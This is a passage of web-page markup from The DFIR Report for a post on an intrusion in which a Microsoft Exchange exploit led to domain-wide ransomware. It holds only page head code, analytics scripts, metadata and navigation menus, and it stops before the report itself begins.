<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Exchange Exploit Leads to Domain Wide Ransomware &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/14.4/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.7.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<style id='akismet-widget-style-inline-css' type='text/css'>

			.a-stats {
				--akismet-color-mid-green: #357b49;
				--akismet-color-white: #fff;
				--akismet-color-light-grey: #f6f7f7;

				max-width: 350px;
				width: auto;
			}

			.a-stats * {
				all: unset;
				box-sizing: border-box;
			}

			.a-stats strong {
				font-weight: 600;
			}

			.a-stats a.a-stats__link,
			.a-stats a.a-stats__link:visited,
			.a-stats a.a-stats__link:active {
				background: var(--akismet-color-mid-green);
				border: none;
				box-shadow: none;
				border-radius: 8px;
				color: var(--akismet-color-white);
				cursor: pointer;
				display: block;
				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen-Sans', 'Ubuntu', 'Cantarell', 'Helvetica Neue', sans-serif;
				font-weight: 500;
				padding: 12px;
				text-align: center;
				text-decoration: none;
				transition: all 0.2s ease;
			}

			/* Extra specificity to deal with TwentyTwentyOne focus style */
			.widget .a-stats a.a-stats__link:focus {
				background: var(--akismet-color-mid-green);
				color: var(--akismet-color-white);
				text-decoration: none;
			}

			.a-stats a.a-stats__link:hover {
				filter: brightness(110%);
				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06), 0 0 2px rgba(0, 0, 0, 0.16);
			}

			.a-stats .count {
				color: var(--akismet-color-white);
				display: block;
				font-size: 1.5em;
				line-height: 1.4;
				padding: 0 13px;
				white-space: nowrap;
			}
		
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/14.4/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/14.4/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/p/jetpack/14.4/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/4551" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.2" />
<link rel="canonical" href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=4551' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F11%2F15%2Fexchange-exploit-leads-to-domain-wide-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F11%2F15%2Fexchange-exploit-leads-to-domain-wide-ransomware%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="d4f6f922a1a6506cd6aa1d03-text/javascript"></script>
		<script type="d4f6f922a1a6506cd6aa1d03-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="d4f6f922a1a6506cd6aa1d03-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=7BF8F2C4481FCBC495CB313974DF14FC');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Exchange Exploit Leads to Domain Wide Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" />
<meta property="og:description" content="In late September 2021, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case wer…" />
<meta property="article:published_time" content="2021-11-15T02:06:59+00:00" />
<meta property="article:modified_time" content="2024-05-07T00:52:57+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2021/11/ransom2.png" />
<meta property="og:image:width" content="850" />
<meta property="og:image:height" content="649" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Exchange Exploit Leads to Domain Wide Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2021/11/ransom2.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-4551 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
